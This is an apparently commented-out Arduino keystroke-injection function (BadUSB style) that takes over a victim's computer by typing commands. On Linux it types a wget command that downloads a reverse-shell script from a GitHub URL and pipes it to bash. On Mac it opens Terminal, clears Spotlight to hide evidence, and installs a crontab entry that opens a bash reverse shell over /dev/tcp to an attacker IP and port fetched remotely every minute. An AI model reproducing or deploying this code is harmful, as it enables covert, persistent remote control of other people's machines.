/*void inject_shell(){
  String master_url = "https://raw.githubusercontent.com/peterapps/BadArduino/master/client_scripts/";
  Keyboard.begin();
  String cmd;
  int str_len;
  switch (os){
    case 0: { // Linux
      // Open terminal
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press(KEY_LEFT_ALT);
      Keyboard.press('t');
      delay(100);
      Keyboard.releaseAll();
      delay(1000);
      // Install the script and exit the terminal
      cmd = "wget -O - " + master_url + "reverse_shell_linux.sh | bash; exit";
      str_len = cmd.length() + 1;
      char cmd1[str_len];
      cmd.toCharArray(cmd1, str_len);
      Keyboard.print(cmd1);
      Keyboard.write(KEY_RETURN);
      break;
    } case 1: {// Mac
      // Open Spotlight search
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press(' ');
      delay(100);
      Keyboard.releaseAll();
      // Open terminal
      Keyboard.print("Terminal");
      delay(250);
      Keyboard.write(KEY_RETURN);
      // Open Spotlight search again
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press(' ');
      delay(100);
      Keyboard.releaseAll();
      // Clear Spotlight search to hide the evidence
      Keyboard.write(KEY_BACKSPACE);
      delay(250);
      Keyboard.write(KEY_ESC);
      delay(1500);
      // Terminate any current processes
      Keyboard.press(KEY_LEFT_CTRL);
      Keyboard.press('c');
      delay(100);
      Keyboard.releaseAll();
      delay(100);
      Keyboard.write(KEY_RETURN);
      delay(100);
      // In the Terminal run a command
      // Keyboard.print("bash <(curl -s https://raw.githubusercontent.com/peterapps/BadArduino/master/client_scripts/reverse_shell_mac.sh)"); // Run install script
      String ip = "$(curl -L " + master_url + "ATTACKER_IP.txt)";
      String port = "$(curl -L " + master_url + "ATTACKER_PORT.txt)";
      cmd = "(crontab -l 2>/dev/null; echo \"* * * * * bash -i >& /dev/tcp/" + ip + "/" + port + " 0>&1\") | crontab - ";
      str_len = cmd.length() + 1;
      char cmd2[str_len];
      cmd.toCharArray(cmd2, str_len);
      Keyboard.print(cmd);
      Keyboard.write(KEY_RETURN);
      delay(5000); // TODO: Figure out how long it will take to install the script
      // Quit the Terminal
      Keyboard.press(KEY_LEFT_GUI);
      Keyboard.press('q');
      delay(100);
      Keyboard.releaseAll();
      break;
    }
  }
  delay(100);
  Keyboard.end();
}*/
